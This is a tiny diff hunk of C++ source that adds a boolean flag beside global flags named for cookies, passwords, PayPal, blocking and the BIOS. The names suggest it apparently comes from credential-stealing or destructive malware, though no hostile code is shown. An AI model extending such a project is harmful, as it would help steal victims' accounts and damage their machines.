@@ -9,5 +9,6 @@
 #pragma comment(lib, "winmm")
 
 extern bool _form1_opened = false;
+extern bool right_close = false;
 extern int count = 0;
 extern bool cookie_did = false, password_did = false, info_did = false, paypal_did = false, blocking_did = false, bios_did = false;
